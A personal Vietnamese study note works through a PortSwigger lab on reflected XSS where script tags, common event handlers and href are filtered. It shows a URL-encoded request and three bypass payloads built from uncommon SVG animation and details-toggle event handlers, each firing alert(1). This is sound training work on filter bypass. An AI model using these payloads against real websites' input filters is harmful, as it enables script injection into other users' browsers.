![[filter-bypass-event.png]]
lab search bị chặn script + chặn hết event handler quen thuộc + chặn href, phải dùng tag SVG lạ.

> [!NOTE] phân tích đề
> - đề cho search, có whitelist tag nhưng block hết event + `href`.
> - mình đã verify trên portswigger.net: lab "Reflected XSS with event handlers and href attributes blocked".
> - thử `<script>`, `<img onerror>`, `<svg onload>` -> đều bị chặn / strip.
> - nhưng `<svg>` + `<animatetransform>` thì lọt.
> - đọc thêm [[lys thuyet XSS]] + [[xss-filter bypass]].

### hướng giải
- [ ] bắn baseline `<script>alert(1)</script>` -> bị chặn.
- [ ] bắn `<img src=x onerror=alert(1)>` -> `onerror` bị strip.
- [ ] fuzz tag SVG cho phép -> thấy `<svg>` + `<animate>` / `<animatetransform>` còn sống.
- [ ] dùng event lạ `onbegin` -> bypass.

### giải
request:
```http
GET /?search=%3Csvg%3E%3Canimatetransform+onbegin%3Dalert%281%29%3E HTTP/1.1
```

payload 1 (chạy được):
```html
<svg><animatetransform onbegin=alert(1)>
```

payload 2 dự phòng (vẫn là họ SVG để khỏi bị strip như img):
```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

payload 3 dự phòng (đổi hẳn tag):
```html
<details open ontoggle=alert(1)>
```

kết quả:
-> alert(1) hiện dù filter chặn `script` + `onerror` + `href`.
![[filter-bypass-event-result.png]]

> [!NOTE] bài học
> - sau khi quan sát lab này mình thấy... blocklist không bao giờ đủ.
> -> server quên 1 tag + 1 event là mình lọt.
> - nên mình khi bị chặn thì đừng sửa payload cũ, đổi hẳn sang tag + event ít ai dùng.
